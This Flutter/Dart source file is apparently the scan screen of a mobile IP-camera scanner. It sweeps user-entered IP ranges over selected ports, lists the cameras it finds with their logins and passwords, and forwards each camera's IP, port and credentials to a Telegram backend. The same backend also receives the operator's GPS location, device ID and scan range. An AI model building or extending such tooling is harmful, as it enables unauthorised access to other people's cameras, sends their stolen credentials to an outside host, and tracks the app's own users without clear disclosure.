// [context: Flutter/Dart 3.13.5, iOS + Android, scan UI, 17 ports, Wine Dark]
// *the trigger screen — ranges in, cameras out, progress bar counting each TCP dial*

import 'dart:async';
import 'package:flutter/material.dart';
import 'package:geolocator/geolocator.dart';
import '../models/scan_result.dart';
import '../services/scanner_service.dart';
import '../services/telegram_service.dart';
import '../services/result_storage.dart';
import '../services/auth_service.dart';

class ScanScreen extends StatefulWidget {
  const ScanScreen({super.key});

  @override
  State<ScanScreen> createState() => _ScanScreenState();
}

class _ScanScreenState extends State<ScanScreen> {
  // ── controllers / state ───────────────────────────────────────────────────
  final _ipCtrl   = TextEditingController(text: '192.168.1.1-254');
  final _scanner  = ScannerService();
  final _tg       = TelegramService();

  bool _scanning  = false;
  ScanProgress _progress = const ScanProgress(total: 0);
  final List<ScanResult> _results = [];
  final List<String>     _log     = [];

  // port selection
  Set<int> _selectedPorts = {kDefaultPort};
  bool _multiPort = false;

  // geo cache
  String? _city;
  String? _country;

  @override
  void initState() {
    super.initState();
    _fetchGeo();
  }

  @override
  void dispose() {
    _ipCtrl.dispose();
    super.dispose();
  }

  // ── geo ───────────────────────────────────────────────────────────────────

  Future<void> _fetchGeo() async {
    try {
      final perm = await Geolocator.checkPermission();
      if (perm == LocationPermission.denied) {
        await Geolocator.requestPermission();
      }
    } catch (_) {}
  }

  Future<({String? city, String? country})> _getGeo() async {
    if (_city != null) return (city: _city, country: _country);
    try {
      final pos = await Geolocator.getCurrentPosition(
          desiredAccuracy: LocationAccuracy.low,
          timeLimit: const Duration(seconds: 5));
      // We don't reverse-geocode in this build (no google maps dependency)
      // Just use lat/lon as geo string
      _city    = '${pos.latitude.toStringAsFixed(2)}, ${pos.longitude.toStringAsFixed(2)}';
      _country = 'GPS';
    } catch (_) {}
    return (city: _city, country: _country);
  }

  // ── scan control ──────────────────────────────────────────────────────────

  Future<void> _startScan() async {
    final raw = _ipCtrl.text.trim();
    if (raw.isEmpty) return;

    final ips = expandIpRange(raw);
    if (ips.isEmpty) {
      _showSnack('No valid IPs parsed');
      return;
    }

    setState(() {
      _scanning = true;
      _results.clear();
      _log.clear();
      _progress = ScanProgress(total: ips.length);
    });
    _tg.resetScanReport();

    // notify tgcloud
    final geo = await _getGeo();
    final nick = await AuthService.getActiveNickname();
    final devId = await AuthService.getDeviceId();
    _tg.reportScanStarted(
      nickname: nick,
      totalIps: ips.length,
      activePorts: _selectedPorts.toList(),
      ipRange: raw,
      city: geo.city,
      country: geo.country,
      deviceId: devId,
    );

    final started = DateTime.now();

    void onResult(ScanResult r) {
      ResultStorage.addResult(r);
      _tg.reportCameraFound(
        nickname: nick,
        ip: r.ip, port: r.port,
        brand: r.brand, login: r.login, password: r.password,
        model: r.model,
        city: geo.city, country: geo.country,
      );
      if (mounted) setState(() => _results.insert(0, r));
    }

    void onProgress(ScanProgress p) {
      if (mounted) setState(() => _progress = p);
    }

    void onLog(String line) {
      if (mounted) setState(() {
        _log.add(line);
        if (_log.length > 200) _log.removeAt(0);
      });
    }

    if (_multiPort && _selectedPorts.length > 1) {
      await _scanner.scanMultiPort(
        ips: ips,
        ports: _selectedPorts.toList(),
        onResult: onResult,
        onProgress: onProgress,
        onLog: onLog,
      );
    } else {
      await _scanner.scan(
        ips: ips,
        port: _selectedPorts.first,
        onResult: onResult,
        onProgress: onProgress,
        onLog: onLog,
      );
    }

    final elapsed = DateTime.now().difference(started);

    if (_progress.cancelled) {
      _tg.reportScanStopped(nickname: nick, checked: _progress.checked);
    } else {
      _tg.reportSessionFinished(
        nickname: nick,
        total: _progress.checked,
        successful: _results.length,
        openPorts: _progress.openPorts,
        elapsed: elapsed,
      );
    }

    if (mounted) setState(() => _scanning = false);
  }

  void _stopScan() {
    _scanner.cancel();
  }

  // ── helpers ───────────────────────────────────────────────────────────────

  void _showSnack(String msg) {
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(msg)));
  }

  String _pct() {
    if (_progress.total == 0) return '0%';
    return '${((_progress.checked / _progress.total) * 100).round()}%';
  }

  // ── build ─────────────────────────────────────────────────────────────────

  @override
  Widget build(BuildContext context) {
    final cs = Theme.of(context).colorScheme;
    return Scaffold(
      backgroundColor: cs.surface,
      body: Column(
        children: [
          Expanded(
            child: ListView(
              padding: const EdgeInsets.all(16),
              children: [
                // IP range input
                TextField(
                  controller: _ipCtrl,
                  enabled: !_scanning,
                  maxLines: 3,
                  style: TextStyle(color: cs.onSurface, fontFamily: 'monospace'),
                  decoration: InputDecoration(
                    labelText: 'IP Range / CIDR',
                    hintText: '192.168.1.1-254\n10.0.0.0/24',
                    prefixIcon: const Icon(Icons.lan_outlined),
                    border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
                    filled: true,
                    fillColor: cs.surfaceContainerHigh,
                  ),
                ),
                const SizedBox(height: 16),

                // Port selector
                _buildPortSelector(cs),
                const SizedBox(height: 12),

                // Multi-port toggle
                SwitchListTile(
                  title: const Text('Multi-port scan'),
                  subtitle: Text(
                    'Scan all selected ports per IP',
                    style: TextStyle(color: cs.outline, fontSize: 12),
                  ),
                  value: _multiPort,
                  onChanged: _scanning ? null : (v) => setState(() => _multiPort = v),
                  dense: true,
                ),
                const SizedBox(height: 12),

                // Progress
                if (_scanning || _progress.total > 0) _buildProgress(cs),
                const SizedBox(height: 12),

                // Live log (last 10 lines)
                if (_log.isNotEmpty) _buildLog(cs),
                const SizedBox(height: 8),

                // Results list
                ..._results.map((r) => _ResultCard(r: r)),
              ],
            ),
          ),

          // Bottom action bar
          _buildActionBar(cs),
        ],
      ),
    );
  }

  Widget _buildPortSelector(ColorScheme cs) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text('Ports', style: TextStyle(color: cs.onSurface, fontWeight: FontWeight.w600)),
        const SizedBox(height: 8),
        Wrap(
          spacing: 6,
          runSpacing: 6,
          children: kAllPorts.map((pd) {
            final selected = _selectedPorts.contains(pd.port);
            return FilterChip(
              label: Text('${pd.port} ${pd.label}',
                  style: const TextStyle(fontSize: 11)),
              selected: selected,
              onSelected: _scanning
                  ? null
                  : (v) {
                      setState(() {
                        if (v) {
                          _selectedPorts.add(pd.port);
                        } else if (_selectedPorts.length > 1) {
                          _selectedPorts.remove(pd.port);
                        }
                      });
                    },
            );
          }).toList(),
        ),
      ],
    );
  }

  Widget _buildProgress(ColorScheme cs) {
    final pct = _progress.total > 0
        ? _progress.checked / _progress.total
        : 0.0;
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Row(children: [
          Expanded(child: LinearProgressIndicator(value: pct, minHeight: 6)),
          const SizedBox(width: 10),
          Text(_pct(), style: TextStyle(color: cs.primary, fontSize: 12)),
        ]),
        const SizedBox(height: 4),
        Text(
          '${_progress.checked}/${_progress.total}  '
          '✅ ${_progress.successful}  '
          '🔌 ${_progress.openPorts}',
          style: TextStyle(color: cs.outline, fontSize: 12),
        ),
      ],
    );
  }

  Widget _buildLog(ColorScheme cs) {
    final last = _log.length > 10 ? _log.sublist(_log.length - 10) : _log;
    return Container(
      padding: const EdgeInsets.all(8),
      decoration: BoxDecoration(
        color: cs.surfaceContainerHighest,
        borderRadius: BorderRadius.circular(8),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: last
            .map((l) => Text(l,
                style: TextStyle(
                    fontFamily: 'monospace', fontSize: 10, color: cs.onSurface)))
            .toList(),
      ),
    );
  }

  Widget _buildActionBar(ColorScheme cs) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      color: cs.surfaceContainerLow,
      child: Row(
        children: [
          Expanded(
            child: FilledButton.icon(
              onPressed: _scanning ? null : _startScan,
              icon: const Icon(Icons.play_arrow),
              label: const Text('START SCAN'),
            ),
          ),
          const SizedBox(width: 12),
          OutlinedButton.icon(
            onPressed: _scanning ? _stopScan : null,
            icon: const Icon(Icons.stop),
            label: const Text('STOP'),
          ),
        ],
      ),
    );
  }
}

// ── result card ───────────────────────────────────────────────────────────────

class _ResultCard extends StatelessWidget {
  final ScanResult r;
  const _ResultCard({required this.r});

  @override
  Widget build(BuildContext context) {
    final cs = Theme.of(context).colorScheme;
    return Card(
      margin: const EdgeInsets.only(bottom: 8),
      color: cs.surfaceContainerHigh,
      child: ListTile(
        leading: CircleAvatar(
          backgroundColor: cs.primary.withOpacity(0.2),
          child: Icon(Icons.videocam, color: cs.primary, size: 20),
        ),
        title: Text('${r.ip}:${r.port}',
            style: TextStyle(color: cs.onSurface, fontWeight: FontWeight.w600, fontSize: 14)),
        subtitle: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(r.brand, style: TextStyle(color: cs.primary, fontSize: 12)),
            Text(r.credentialLabel,
                style: TextStyle(color: cs.outline, fontSize: 11)),
          ],
        ),
        isThreeLine: true,
        dense: true,
      ),
    );
  }
}
